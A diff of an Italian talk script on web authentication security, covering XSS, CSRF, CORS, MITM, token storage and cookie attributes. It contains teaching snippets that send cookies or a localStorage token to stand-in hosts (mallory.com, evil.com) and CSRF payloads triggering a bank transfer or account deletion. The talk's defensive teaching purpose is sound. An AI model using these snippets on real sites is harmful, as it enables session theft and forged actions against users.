@@ -1,99 +1,243 @@
-# Presentazione
+# Autenticazione Web Sicura: Da XSS a OAuth2
 
-## Intro
+## Introduzione
 
-Allora, oggi vi volevo portare un po di argomenti relativi alla sicurezza ed autenticazione. Ci concentriamo sicuramente non negli attacchi che si vedono nei film, ma su un qualcosa di molto piu basilare. Anzi, copriremo molti concetti di base prima e solo dopo tocchiamo l'autenticazione. Alla fine molte volte, a discapito di quel che si vede nei film, un attacco si fonda spesso e volentieri su un qualcosa di semplice, piuttosto che una trovata scentifica o teorica gigantesca, un click su una mail, un query param non sanitizzato.
+Allora, allora, allora, allora
 
-Ho pensato quindi prima di arrivare al concetto della autenticazione, di integrare in questa presentazione, non solo le best practice, sopratutto concetti core del mondo WEB che per quando le ho dovuto studiare io non sono state per niente banali da capire, da come funzionano i coockie al flow di un autenticazione. Essendo gia solo questi belli ostici, cerchero di spiegarli senza codice, ma con degli esempi facili e provero a metterlo su un teorico, ma ho comunque degli esempi da far vedere, senza vedere codice, al massimo qualche configurazione. E solo dopo un framework che ho fatto per consentire di semplificare lo sviluppo e tenere conto di aluni aspetti.
+Oggi vi volevo portare un po di argomenti relativi alla sicurezza ed autenticazione, stando abbastanza vicini al mondo del browser come argomento.
+Non mi concentrero' sugli attacchi hollywoodiani con gli hacker incappucciati, ma su un qualcosa di piu basilare. Parleremo di molti concetti di base prima e solo dopo parliamo di autenticazione, in particolare di un pattern di autenticazione che sta prendendo piede in quanto risponde a tantissimi criteri di securezza:
 
-Quindi volevo dividere la mia presentazione in due sezioni: la prima non opinabile che elenca dei fatti sui concetti base, la seconda opinabile in quanto tratta un qualcosa che ho fatto io.
+Fatta questa premessa, oggi quindi vedremo:
 
-TODO: sarebbe carino dire come in Topless le domande che sembrano insensate
+- Come si rubano i token?
+- Perché HTTPS non basta per essere sicuri?
+- Un framework FE X ci protegge davvero da XSS?
+- CORS protegge veramente dalle richiesta provenienti da origini inaspettate?
+- Se localstorage, session storage, memoria js non sono sicuri per un token, lo abbiamo sentito tutti tantissime volte, quale e' il posto sicuro?
+- Cosa c'entra OAuth2 con tutto questo?
+- Cos'è PKCE?
+- Ed infine il Pattern Backend for Frontend
 
-## Cross-Site Scripting
+## Cross-Site Scripting (XSS) Quando il tuo sito esegue codice di qualcun altro
 
-**Cross-Site Scripting: quando il tuo sito esegue codice di qualcun altro**
+Partiamo dalle cose piu banali: Cross-Site Scripting. È uno degli attacchi più preistorici del web.
 
-TODO: inserire un esempio
+Il concetto è semplice: un attaccante riesce a iniettare JavaScript malevolo nel'applicazione.
+Può essere attraverso:
 
-**Discorso:**
+- un campo di input non sanitizzato
+- un parametro URL
+- un commento in un forum
+- un messaggio in una chat
+- un nome utente o profilo
+- un titolo di un post o articolo
+- header HTTP manipolati
+- notifiche o email
+- widget di terze parti
+- dipendenze npm con codice malevolo
+- estensioni browser maligne
+- redirect URL non validati
+- qualsiasi cosa che finisce renderizzata nel browser senza essere escapata
 
-Partiamo dalle basi: XSS, che e' un po un nemico invisibile, Cross-Site Scripting. È uno degli attacchi più preistorici del web.
+Cosa può fare questo script? Tutto quello che può fare JavaScript:
 
-Il concetto è semplice: un attaccante riesce a inyettare JavaScript malevolo nella applicazione. Può essere attraverso un campo di input non sanitizzato, un parametro URL, un commento in un forum, qualsiasi cosa che finisce renderizzata nel browser senza essere escapata.
-
-E cosa può fare questo script? Tutto quello che può fare JavaScript: leggere i cookie, accedere al localStorage, fare richieste HTTP, modificare il DOM, rubare token di autenticazione...
-
-Il problema vero è che se i tuoi token di autenticazione sono accessibili a JavaScript (tipo nel localStorage), un attacco XSS significa game over. L'attaccante ha accesso completo all'account dell'utente.
-
-TODO: serve dire che i framework modermi prevengono questo ma ci sono comunque dei casi dove questo e' stato pobbilile bucare.
-TODO: serve includere qualche caso di atacco famoso avvenuto di recente.
-TODO: sevre dire che non e' che sia limitato come problema solo se usiamo local storage, session storage o coockie, ma anche quando si tiene il token in javascript, quindi qualunque posto accessibile a JS
-
-## CSRF - L'Attacco Silenzioso
-
-**Cross-Site Request Forgery: quando il tuo browser lavora contro di te**
+- leggere i cookie
+- accedere al localStorage
+- fare richieste HTTP
+- modificare il DOM
+- rubare token di autenticazione
+- installare keylogger.
 
 ```html
-<!-- Pagina dell'attaccante -->
-<img src="https://bank.com/transfer?to=attacker&amount=10000" />
-
-<!-- Oppure più subdolo -->
-<form action="https://yourapp.com/api/delete-account" method="POST">
-  <input type="hidden" name="confirm" value="yes" />
-</form>
 <script>
-  document.forms[0].submit();
+  fetch("https://mallory.com/steal?data=" + document.cookie);
 </script>
 ```
 
-**Discorso:**
+Lo stesso esempio che vediamo sompra come snippet lo possiamo avere non solo per o coockie, ma anche per un bearer classico dentro al javascript. Quindi la prima premessa e' questa:
 
-CSRF è più subdolo di XSS. Non richiede di inyettare codice nella tua app. L'attaccante crea una pagina malevola su un altro dominio e sfrutta il fatto che il browser invia automaticamente i cookie con ogni richiesta.
+> Qualsiasi dato accessibile a JavaScript è accessibile a un attaccante tramite XSS.
 
-Scenario classico: sei loggato su yourapp.com. Visiti evil.com (magari perché hai cliccato su un link in una email di phishing). La pagina evil.com contiene un form nascosto che fa una POST a yourapp.com/api/delete-account.
+**Framework moderni e XSS:**
 
-Il browser, bravo cittadino che è, invia automaticamente i tuoi cookie di autenticazione con quella richiesta. Il server vede una richiesta autenticata e... cancella il tuo account.
+React, Vue, Angular escapano automaticamente il contenuto, riducendo il rischio XSS. Ma non lo eliminano completamente:
 
-"Ma aspetta," direte voi, "non bastano i CORS?"
+- `dangerouslySetInnerHTML` in React
+- `v-html` in Vue
+- Librerie di terze parti vulnerabili, un qualcosa su cui noi non abbiamo controllo
+  - Possono essere ataccate o essere malevole loro stesse
 
-TODO: dire che i cors non funzonano sempre. Certe volte la richiesta OPTIONS non viene neanche inviata per alcune chiamate, e magari il browser non riuscira a leggere la risposta, ma il server la chiamata la esegue tranquillamente. E un meccanismo diverso, dedicato piu al browser che come una scurezza tulle vulnerabilita' cross site in generale
+Quindi di base dire tanto uso react, non avro mai una XSS, e' profondamente sbagliato.
 
-Ci sono metodi eleganti che risolvono questa vulnerabilita' e trattano la configurazione dei coockie che vedremo tra poco
+**Esempio dangerouslySetInnerHTML:**
 
-TODO: quindi guia qua possiabmo distinguere i primi due metodi principali di autenticazione: Quello che usa i bearer quindi ha il token dentro javascript e quindi accessibile a qualunque attacco XSS, e quello con i coockie che non sono vulnerabili a XSS ma alle XSRF, ma con delle configurazioni appropriate puo essere messo in totale sicurezza, mentre questo non vale per l'autenticazione fatta con gli header.
+Perche uno sviluppatore potrebbe essere atratto dal usare dangerouslySetInnerHTML? Gia il nome dovrebbe par pensare due volte, no? In realta degli scenari ci sono, ad esempio puo essere convertire un contenuto markdown in html. Come fa ChatGPT ad esempio. Oppure potrebbe essere il rendering delle email, sempre in html.
 
-## Man-in-the-Middle - L'Intercettazione
+**Casi reali:**
 
-**Quando qualcuno ascolta le tue conversazioni**
+- **British Airways (2018)**: Script malevolo iniettato tramite dipendenza compromessa. 380.000 carte di credito rubate.
+- **Magecart attacks**: Migliaia di e-commerce colpiti da script iniettati che rubano dati di pagamento.
 
+**Conclusione:**
+I danni che puo fare l'XSS sono tanti, io mi concentrero concentrero soprattto sul tema della autenticazione. Come facciamo a prevenire attacchi XSS su quella? La difesa principale sarebbe non memorizzare dati sensibili in posti accessibili a JavaScript. In questa maniera se un attaccante prova ad accederci banalmente non puo leggere nulla. Prima di passare al come, vediamo un'altro attacco prima.
+
+## Cross-Site Request Forgery (CSRF) Quando il tuo browser lavora contro di te
+
+CSRF è altrettanto preistorico come XSS, ma un po più subdolo. Non richiede di iniettare codice nel'app. L'attaccante crea una pagina malevola su un altro dominio e sfrutta il fatto che il browser invia automaticamente i cookie con ogni richiesta.
+
+```html
+<img src="https://bank.com/transfer?to=mallory&amount=10000" />
 ```
-User → [Attacker] → Server
 
-L'attaccante può:
-- Leggere tutto il traffico
-- Modificare richieste e risposte
-- Rubare token e credenziali
+Scenario classico: sei loggato su yourapp.com. Visiti mallory.com (magari perché hai cliccato su un link in una email di phishing). La pagina evil.com contiene un form nascosto che fa una POST a yourapp.com/api/delete-account.
+
+Il browser invia automaticamente i cookie di autenticazione dell'utente con quella richiesta. Il server vede una richiesta autenticata e... cancella l'account.
+
+Questo e' solo un esempio ma si puo tradurre in:
+
+- Account cancellati
+- Soldi trasferiti
+- dati modificati
+- e tanto altro
+
+**"Ma i CORS non proteggono da questo?"**
+
+Una domanda spontanea potrebbe essere questa: non ci dovrebbero proteggere i cors da attacchi fatte con le richieste cross site? o meglio cross origin?
+
+Sfortunatamente no, o non del tutto. CORS è un meccanismo diverso che protegge la **lettura** delle risposte cross-origin, non l'**esecuzione** delle richieste.
+
+**Passo indietro: Come funzionano i CORS?**
+
+Partiamo dalla **Same-Origin Policy (SOP)**:
+
+SOP dice: "JavaScript che sta su `example.com` non può leggere risposte da `api.example.com`"
+
+A volte pero abbiamo bisogno di farlo, banalmente quando il be ed il fe stanno su origini doverse.
+Qui entra **CORS (Cross-Origin Resource Sharing)**. E' un rilassamento della SOP, quindi e' meno restrittivo:
+
+**Come funziona**
+
+1. **Simple Request** (GET, POST con content-type semplice):
+
+```txt
+Browser: "Faccio richiesta da example.com a api.example.com"
+Browser → Server: GET /data
+Server → Browser: 200 OK, Access-Control-Allow-Origin: https://example.com
+Browser: "Ok, il server permette. JavaScript può leggere la risposta"
 ```
 
-**Discorso:**
+2. **Preflight Request** (richieste complesse: PUT, DELETE, header custom, etc.):
 
-Man-in-the-Middle è esattamente quello che sembra: qualcuno si mette in mezzo tra te e il server.
+```txt
+Browser: "Prima chiedo il permesso con OPTIONS"
 
-Può succedere su reti WiFi pubbliche non sicure, attraverso DNS poisoning, o se qualcuno compromette un router nella catena. L'attaccante vede tutto il traffico HTTP in chiaro.
+Browser → Server: OPTIONS /data
+                  Origin: https://example.com
+                  Access-Control-Request-Method: DELETE
+                  Access-Control-Request-Headers: Authorization
 
-TODO: Non e' cosi difficile da fare come si potrebbe pensare in realta'.
+Server → Browser: 200 OK
+                  Access-Control-Allow-Origin: https://example.com
+                  Access-Control-Allow-Methods: DELETE, GET, POST
+                  Access-Control-Allow-Headers: Authorization
+                  Access-Control-Max-Age: 86400
 
-La soluzione? HTTPS.
+Browser: "Permesso concesso.
 
-Fino a qui probabilmente ho detto cose abbastanza banali, ma ci basta HTTPS? Le cose si fanno complicate proprio la dove questo non basta.
+Browser → Server: DELETE /data
+                  Origin: https://example.com
+                  Authorization: Bearer token
+
+Server → Browser: 200 OK
+                  Access-Control-Allow-Origin: https://example.com
+```
+
+**Chi legge gli header CORS?**
+
+Il **browser**. Il server invia gli header, ma è il browser che decide se JavaScript può leggere la risposta.
+
+**Cosa fa il browser:**
+
+1. Vede che JavaScript sta facendo una richiesta cross-origin
+2. Invia la richiesta al server
+3. Riceve la risposta con header CORS
+4. Controlla `Access-Control-Allow-Origin`
+5. Se match → JavaScript può leggere la risposta
+6. Se no match → Blocca l'accesso, JavaScript vede errore CORS
+
+Quando `evil.com` fa una richiesta a `yourapp.com`:
+
+- La richiesta viene **eseguita** dal server
+- Il server **processa** l'azione (cancella account, trasferisce soldi)
+- Il browser **blocca** solo la lettura della risposta da parte di `evil.com`
+
+Si... anche la POST in certe configurazioni
+
+**Protezioni contro CSRF:**
+
+Ci sono metodi alternativi storici ormai, come CSRF-Token ma secondo me ormai ci sono metodi piu facili ed eleganti, ad esempio i Coockie SameSite Strict
+
+- `Strict`: Cookie mai inviato da altri siti
+- `Lax`: Cookie inviato solo su navigazioni top-level GET
+- `None`: Cookie sempre inviato
+
+**Distinzione importante:**
+
+- **Bearer token in header Authorization**: Vulnerabile a XSS, immune a CSRF (header non inviati automaticamente)
+- **Cookie HTTP-only con SameSite=Strict**: Immune a XSS, immune a CSRF
+
+## Man in the Middle
+
+Man-in-the-Middle è esattamente quello che sembra, cioe qualcuno si mette in mezzo tra noi ed il server.
+
+Può succedere su reti WiFi pubbliche non sicure e vede tutto il traffico HTTP in chiaro.
+
+Non e' cosi difficile da fare come si potrebbe pensare in realta'. E non e' neanche cosi improbabile in realta'.
+
+**Scenari comuni:**
+
+**1. WiFi pubblico non sicuro**
+
+```txt
+Caffetteria, aeroporto, hotel
+→ Traffico non crittografato visibile a chiunque sulla rete
+```
+
+**2. DNS Poisoning**
+
+```txt
+Attaccante modifica DNS
+yourapp.com → IP dell'attaccante invece del server reale
+```
+
+**3. Router compromesso**
+
+```txt
+Malware sul router di casa/ufficio
+Tutto il traffico passa attraverso l'attaccante
+```
+
+La soluzione: HTTPS, cripta tutto il traffico tra browser e server. Anche se qualcuno intercetta i pacchetti, vede solo dati crittografati.
+
+**Ma HTTPS non basta da solo:**
+
+Fino a qui probabilmente ho detto cose abbastanza banali, ma ci basta HTTPS?.
 se poi i tuoi cookie non hanno il flag `secure: true`. Senza quel flag, il browser potrebbe inviare il cookie anche su connessioni HTTP, e lì l'attaccante può intercettarlo.
 
-Questo è il motivo per cui tutti i cookie di autenticazione devono avere delle configurazione particolari dei quali parliamo nella prossima slide.
+Questo per dire che cosa? Come vedete come questi attacchi sono interconnessi. Non possiamo proteggerci da uno solo unando come assunzione solo una tecnologia come:
 
-Vedete come questi attacchi sono interconnessi? Non puoi proteggerti da uno solo. Devi pensare alla sicurezza come a un sistema di difese multiple.
+- tanto uso React
+- tanto sono in HTTPS
+- tanto ho CORS
+- tanto gli utenti sono in VPN
 
-## I Cookie - Non Sono Tutti Uguali
+Non esiste un parametro unico che settato quello siamo sicuri su tutti i fronti.
+
+La soluzione alla fine e' una specifica configurazione di vari parametri di tutte queste aree.
+
+## Storage Sicuro
+
+Ok, qua cominciamo a mettere i primi pezzi insieme. Dove mettiamo quindi i dati sensibili?
 
 **localStorage vs sessionStorage vs Cookies**
 
@@ -104,71 +248,65 @@ Vedete come questi attacchi sono interconnessi? Non puoi proteggerti da uno solo
 | Cookie normale   | Sì                    | Sì                    | Sì                          | Configurabile |
 | HTTP-only Cookie | No                    | No                    | Sì                          | Configurabile |
 
-**Discorso:**
+**Perché localStorage e session storage sono pericolosi?:**
+Qualsiasi script può leggerlo:
 
-Ok, parliamo di dove mettere i dati sensibili.
+```javascript
+const stolen = localStorage.getItem("access_token");
+fetch("https://evil.com/steal?token=" + stolen);
+```
 
-Ho visto troppi progetti dove i JWT vengono messi nel localStorage. "È comodo," dicono. "Posso accederci facilmente da JavaScript." Esatto, e può farlo anche un attaccante con un attacco XSS.
+Chi può eseguire questo codice?
 
-localStorage e sessionStorage sono accessibili a qualsiasi script che gira sulla tua pagina. Questo include:
+- Script iniettato tramite XSS
+- Librerie di terze parti (analytics, chat widgets, etc.)
+- Dipendenze npm compromesse
+- Browser extensions malevole
 
-- Il tuo codice (e qui va bene, no?)
-- Codice inyettato tramite XSS (male, ma solo lui?, no)
-- Librerie di terze parti
+**La soluzione: HTTP-only Cookies**
 
-TODO: dire che questo discorso si estende non solo a local storage, ma a qualunque posto che javascript puo raggiungere
+Quando un cookie ha `HttpOnly=true`, il browser:
 
-Se uno qualsiasi di questi è compromesso, i tuoi token sono compromessi.
+- Lo memorizza normalmente
+- Lo invia automaticamente con le richieste HTTP
+- Non lo espone a JavaScript in nessun modo
 
-I cookie normali non sono molto meglio. Puoi leggerli con `document.cookie`, quindi stesso problema.
+Anche con un attacco XSS riuscito, l'attaccante non può leggere cookie.
 
-Ma i cookie HTTP-only? Quelli sono diversi. Il flag `httpOnly: true` dice al browser: "Questo cookie non deve essere accessibile a JavaScript. Mai. Per nessun motivo."
+**Limitazioni:**
 
-Puoi provare a fare `document.cookie` quanto vuoi, non lo vedrai. L'unico modo per accedere a un HTTP-only cookie è attraverso richieste HTTP, e solo il browser può farlo.
+HTTP-only cookies sa soli non sono perfetti:
 
-TODO: dire che quindi di questa tabella l'unica opzione che ci mette piu al sicuro possibile sono i coockie HTTP-only. Ma in realta non bastano, perche ci sono anche altri parametri da configurare, che vediamo adesso
+- Vulnerabili a CSRF
+- Vulnerabili a MITM
+- Non accessibili a JavaScript
 
-## Cookie Attributes - I Dettagli Che Contano
+## Cookie Attributes
 
-**Anatomia di un cookie sicuro**
+Quindi quale e' l'anatomia di un cookie sicuro?
 
 ```javascript
 Set-Cookie: access_token=eyJhbG...;
-  HttpOnly;
-  Secure;
+  HttpOnly=true;
+  Secure=true;
   SameSite=Strict;
   Path=/;
   Max-Age=3600
 ```
 
-**Cosa significa ogni attributo:**
+**Ogni attributo ha uno scopo preciso:**
 
-- `HttpOnly`: Non accessibile da JavaScript (anti-XSS)
-- `Secure`: Solo su HTTPS (anti-MITM)
-- `SameSite=Strict`: Mai inviato da altri siti (anti-CSRF)
-- `SameSite=Lax`: Inviato solo su navigazioni top-level GET
-- `Path=/`: Valido per tutto il sito
-- `Max-Age=3600`: Scade dopo 1 ora
+| Attributo         | Scopo                                     | Protegge da             |
+| ----------------- | ----------------------------------------- | ----------------------- |
+| `HttpOnly`        | Non accessibile da JavaScript             | XSS                     |
+| `Secure`          | Solo su HTTPS                             | MITM                    |
+| `SameSite=Strict` | Mai inviato da altri siti                 | CSRF                    |
+| `SameSite=Lax`    | Inviato solo su navigazioni top-level GET | CSRF (con compromesso)  |
+| `Path=/`          | Valido per tutto il sito                  | Limitazione scope       |
+| `Max-Age=3600`    | Scade dopo 1 ora                          | Limitazione esposizione |
 
-**Discorso:**
-
-Ogni attributo di un cookie ha un significato preciso e una ragione di esistere.
-
-`HttpOnly` l'abbiamo già visto: protezione contro XSS. JavaScript non può toccarlo.
-
-`Secure` significa che il cookie viene inviato solo su connessioni HTTPS. Se qualcuno prova a fare una richiesta HTTP, il browser non include il cookie. Questo protegge da downgrade attacks e MITM.
-
-`SameSite` è più interessante. Ci sono tre valori:
-
-1. `Strict`: Il cookie non viene mai inviato se la richiesta proviene da un altro sito. Massima sicurezza, ma può rompere alcuni flussi legittimi (tipo OAuth callbacks).
-
-2. `Lax`: Il cookie viene inviato solo per navigazioni top-level GET. Se clicchi un link da google.com a yourapp.com, il cookie viene inviato. Ma se evil.com fa una POST o un fetch, no. È un buon compromesso.
-
-3. `None`: Il cookie viene sempre inviato, anche cross-site. Richiede `Secure`. Usatelo solo se avete un motivo molto valido (tipo integrazioni con terze parti).
-
-Per i token di autenticazione, usate `Strict`. Per i cookie del flusso OAuth (state, nonce, code_verifier), usate `Lax` perché dovete permettere il redirect dall'identity provider.
-
-`Path` e `Max-Age` sono più semplici. Path limita dove il cookie è valido. Max-Age dice quando scade. Per i token di accesso, teneteli corti: 15 minuti, 1 ora max. Per i refresh token, potete andare più lunghi, ma con rotazione.
+Token short-lived limitano il danno in caso di compromissione. Se un attaccante ruba un access token, ha solo 15 minuti per usarlo.
+Ogni attributo è un layer di difesa. Insieme creano un cookie che resiste a XSS, CSRF, e MITM.
 
 ## OAuth 2.0 - Il Protocollo Che Regge Il Web
 
